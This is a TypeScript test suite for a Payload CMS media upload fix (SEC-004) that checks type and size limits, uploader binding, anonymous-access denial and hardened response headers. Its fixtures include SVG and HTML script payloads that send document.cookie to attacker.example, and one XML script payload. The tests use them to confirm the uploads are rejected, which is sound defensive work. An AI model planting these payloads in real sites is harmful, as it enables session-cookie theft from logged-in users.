import type { Payload } from 'payload'

import { getPayload } from 'payload'
import { afterAll, beforeAll, describe, expect, it } from 'vitest'

import config from '@/payload.config'
import {
  ALLOWED_UPLOAD_MIME_TYPES,
  MAX_UPLOAD_BYTES,
  UPLOAD_CSP,
  buildUploadResponseHeaders,
} from '@/collections/Media'

import { createPengguna, loginPengguna, TestRegistry } from './helpers'

let payload: Payload
const registry = new TestRegistry()

/**
 * A 1x1 transparent PNG, so `file-type` can detect `image/png` from the
 * buffer. This is the same fixture Payload's own upload tests use.
 */
const PNG_BYTES = Buffer.from(
  'iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVR42mNkYPhfDwAChwGA60e6kgAAAABJRU5ErkJggg==',
  'base64',
)

/**
 * SEC-004: an SVG that carries script. This is the exact payload from the
 * advisory: it executes in the API origin when opened by a logged-in user.
 */
const SVG_BYTES = Buffer.from(
  '<svg xmlns="http://www.w3.org/2000/svg"><script>fetch("https://attacker.example/"+document.cookie)</script></svg>',
  'utf8',
)

const XML_BYTES = Buffer.from(
  '<?xml version="1.0" encoding="UTF-8"?><svg xmlns="http://www.w3.org/2000/svg"><script>alert(1)</script></svg>',
  'utf8',
)

const HTML_BYTES = Buffer.from(
  '<!DOCTYPE html><html><body><script>fetch("https://attacker.example/"+document.cookie)</script></body></html>',
  'utf8',
)

const makeFile = (options: {
  name: string
  mimetype: string
  data: Buffer
}): {
  data: Buffer
  mimetype: string
  name: string
  size: number
} => ({
  data: options.data,
  mimetype: options.mimetype,
  name: options.name,
  size: options.data.length,
})

describe('SEC-004 — upload type restrictions', () => {
  beforeAll(async () => {
    payload = await getPayload({ config })
  })

  afterAll(async () => {
    await registry.cleanup(payload)
  })

  it('accepts a real PNG', async () => {
    const doc = await payload.create({
      collection: 'media',
      data: { alt: 'a pixel' },
      file: makeFile({
        name: 'pixel.png',
        mimetype: 'image/png',
        data: PNG_BYTES,
      }),
      draft: false,
      overrideAccess: true,
    })

    expect(doc.mimeType).toBe('image/png')
    expect(doc.filename).toBeTruthy()
  })

  it('rejects an SVG upload', async () => {
    await expect(
      payload.create({
        collection: 'media',
        data: { alt: 'an svg' },
        file: makeFile({
          name: 'payload.svg',
          mimetype: 'image/svg+xml',
          data: SVG_BYTES,
        }),
        draft: false,
        overrideAccess: true,
      }),
    ).rejects.toThrow()
  })

  it('rejects an XML upload', async () => {
    await expect(
      payload.create({
        collection: 'media',
        data: { alt: 'an xml' },
        file: makeFile({
          name: 'payload.xml',
          mimetype: 'application/xml',
          data: XML_BYTES,
        }),
        draft: false,
        overrideAccess: true,
      }),
    ).rejects.toThrow()
  })

  it('rejects an HTML upload', async () => {
    await expect(
      payload.create({
        collection: 'media',
        data: { alt: 'an html' },
        file: makeFile({
          name: 'payload.html',
          mimetype: 'text/html',
          data: HTML_BYTES,
        }),
        draft: false,
        overrideAccess: true,
      }),
    ).rejects.toThrow()
  })

  it('rejects an SVG that claims to be a PNG', async () => {
    // The type check is performed against the file *buffer*, not against the
    // client-supplied `Content-Type`, so renaming the file does not help.
    await expect(
      payload.create({
        collection: 'media',
        data: { alt: 'a disguised svg' },
        file: makeFile({
          name: 'innocent.png',
          mimetype: 'image/png',
          data: SVG_BYTES,
        }),
        draft: false,
        overrideAccess: true,
      }),
    ).rejects.toThrow()
  })
})

describe('SEC-004 — upload size limit', () => {
  beforeAll(async () => {
    payload = await getPayload({ config })
  })

  afterAll(async () => {
    await registry.cleanup(payload)
  })

  it('rejects a file above the 5 MB limit', async () => {
    const oversized = Buffer.alloc(MAX_UPLOAD_BYTES + 1024, 0x00)

    await expect(
      payload.create({
        collection: 'media',
        data: { alt: 'too big' },
        file: makeFile({
          name: 'big.png',
          mimetype: 'image/png',
          data: oversized,
        }),
        draft: false,
        overrideAccess: true,
      }),
    ).rejects.toThrow()
  })

  it('rejects an oversized replacement upload on update', async () => {
    const doc = await payload.create({
      collection: 'media',
      data: { alt: 'original' },
      file: makeFile({
        name: 'original.png',
        mimetype: 'image/png',
        data: PNG_BYTES,
      }),
      draft: false,
      overrideAccess: true,
    })

    const oversized = Buffer.alloc(MAX_UPLOAD_BYTES + 1024, 0x00)

    await expect(
      payload.update({
        id: doc.id,
        collection: 'media',
        data: { alt: 'replaced' },
        file: makeFile({
          name: 'big.png',
          mimetype: 'image/png',
          data: oversized,
        }),
        draft: false,
        overrideAccess: true,
      }),
    ).rejects.toThrow()
  })
})

describe('SEC-004 — the uploader is bound to the session', () => {
  beforeAll(async () => {
    payload = await getPayload({ config })
  })

  afterAll(async () => {
    await registry.cleanup(payload)
  })

  it('records the uploader from the session, not from the request body', async () => {
    const victim = await createPengguna(payload, registry, 'upload-victim')
    const attacker = await createPengguna(payload, registry, 'upload-attacker')
    const session = await loginPengguna(payload, attacker.email)

    const doc = await payload.create({
      collection: 'media',
      data: {
        alt: 'a file',
        uploadedBy: { relationTo: 'penggunas', value: victim.id },
      },
      file: makeFile({
        name: 'attributed.png',
        mimetype: 'image/png',
        data: PNG_BYTES,
      }),
      draft: false,
      overrideAccess: false,
      user: session,
    })

    const uploadedBy = doc.uploadedBy as
      | { relationTo: string; value: string | { id: string | number } }
      | string
      | number
      | null
      | undefined

    const value =
      typeof uploadedBy === 'object' && uploadedBy !== null && 'value' in uploadedBy
        ? uploadedBy.value
        : uploadedBy

    const id = typeof value === 'object' && value !== null ? value.id : value

    expect(String(id)).toBe(attacker.id)
  })
})

describe('SEC-004 — anonymous access to stored files is denied', () => {
  beforeAll(async () => {
    payload = await getPayload({ config })
  })

  afterAll(async () => {
    await registry.cleanup(payload)
  })

  it('denies an anonymous read of the collection', async () => {
    await expect(payload.find({ collection: 'media', overrideAccess: false })).rejects.toThrow()
  })

  it('denies an anonymous upload', async () => {
    await expect(
      payload.create({
        collection: 'media',
        data: { alt: 'anonymous' },
        file: makeFile({
          name: 'anonymous.png',
          mimetype: 'image/png',
          data: PNG_BYTES,
        }),
        draft: false,
        overrideAccess: false,
      }),
    ).rejects.toThrow()
  })

  it('lets an authenticated user read the collection', async () => {
    const user = await createPengguna(payload, registry, 'upload-reader')
    const session = await loginPengguna(payload, user.email)

    const result = await payload.find({
      collection: 'media',
      overrideAccess: false,
      user: session,
    })

    expect(result.docs).toBeDefined()
  })
})

describe('SEC-004 — configuration assertions', () => {
  it('bounds the multipart parser at the same 5 MB limit', async () => {
    const resolved = await config
    const uploadConfig = resolved.upload

    expect(uploadConfig?.limits?.fileSize).toBe(MAX_UPLOAD_BYTES)
    expect(uploadConfig?.limits?.files).toBe(1)
    expect(uploadConfig?.requestSizeLimit).toBeGreaterThan(MAX_UPLOAD_BYTES)
    expect(uploadConfig?.abortOnLimit).toBe(true)
  })

  it('restricts the collection to the four raster image types', async () => {
    const resolved = await config
    const media = resolved.collections.find((collection) => collection.slug === 'media')
    const upload = media?.upload as { mimeTypes?: string[] } | undefined

    expect(upload?.mimeTypes).toEqual([...ALLOWED_UPLOAD_MIME_TYPES])
    expect(upload?.mimeTypes).not.toContain('image/svg+xml')
    expect(upload?.mimeTypes).not.toContain('application/xml')
    expect(upload?.mimeTypes).not.toContain('text/html')
  })

  it('disables the remote-URL paste path (SSRF)', async () => {
    const resolved = await config
    const media = resolved.collections.find((collection) => collection.slug === 'media')
    const upload = media?.upload as { pasteURL?: unknown } | undefined

    expect(upload?.pasteURL).toBe(false)
  })
})

describe('SEC-004 — response headers for served uploads', () => {
  it('serves an allowed raster image inline, with nosniff and the sandbox CSP', () => {
    const headers = buildUploadResponseHeaders('image/png')

    expect(headers.get('X-Content-Type-Options')).toBe('nosniff')
    expect(headers.get('Content-Security-Policy')).toBe(UPLOAD_CSP)
    expect(headers.get('Content-Security-Policy')).toContain('sandbox')
    expect(headers.get('X-Frame-Options')).toBe('DENY')
    expect(headers.get('Referrer-Policy')).toBe('no-referrer')
    expect(headers.get('Content-Disposition')).toBeNull()
  })

  it('forces a download for a legacy SVG', () => {
    const headers = buildUploadResponseHeaders('image/svg+xml')

    expect(headers.get('Content-Disposition')).toBe('attachment')
    expect(headers.get('Content-Security-Policy')).toContain('sandbox')
  })

  it('forces a download for HTML and XML', () => {
    expect(buildUploadResponseHeaders('text/html').get('Content-Disposition')).toBe('attachment')
    expect(buildUploadResponseHeaders('application/xml').get('Content-Disposition')).toBe('attachment')
  })

  it('forces a download when the content type is unknown', () => {
    expect(buildUploadResponseHeaders(null).get('Content-Disposition')).toBe('attachment')
    expect(buildUploadResponseHeaders(undefined).get('Content-Disposition')).toBe('attachment')
    expect(buildUploadResponseHeaders('').get('Content-Disposition')).toBe('attachment')
  })
})
